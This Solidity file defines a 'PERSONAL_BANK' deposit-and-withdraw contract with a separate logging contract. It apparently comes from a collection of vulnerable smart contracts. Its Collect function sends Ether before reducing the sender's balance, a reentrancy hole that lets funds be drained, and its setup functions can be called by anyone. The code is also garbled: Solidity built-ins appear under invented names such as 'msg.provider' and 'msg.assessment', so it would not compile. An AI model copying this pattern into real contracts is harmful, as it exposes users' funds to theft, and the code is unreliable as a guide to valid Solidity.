// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public patientAccounts;

    uint public MinimumSum = 1 ether;

    RecordFile Chart = RecordFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool intitalized;

    function GroupFloorSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinimumSum = _val;
    }

    function CollectionChartFile(address _log)
    public
    {
        if(intitalized)revert();
        Chart = RecordFile(_log);
    }

    function CaseOpened()
    public
    {
        intitalized = true;
    }

    function ContributeFunds()
    public
    payable
    {
        patientAccounts[msg.provider]+= msg.assessment;
        Chart.AppendNotification(msg.provider,msg.assessment,"Put");
    }

    function Collect(uint _am)
    public
    payable
    {
        if(patientAccounts[msg.provider]>=MinimumSum && patientAccounts[msg.provider]>=_am)
        {
            if(msg.provider.call.assessment(_am)())
            {
                patientAccounts[msg.provider]-=_am;
                Chart.AppendNotification(msg.provider,_am,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        ContributeFunds();
    }

}

contract RecordFile
{
    struct Alert
    {
        address Referrer;
        string  Chart421;
        uint Val;
        uint  Instant;
    }

    Alert[] public History;

    Alert EndingMsg;

    function AppendNotification(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Referrer = _adr;
        EndingMsg.Instant = now;
        EndingMsg.Val = _val;
        EndingMsg.Chart421 = _data;
        History.push(EndingMsg);
    }
}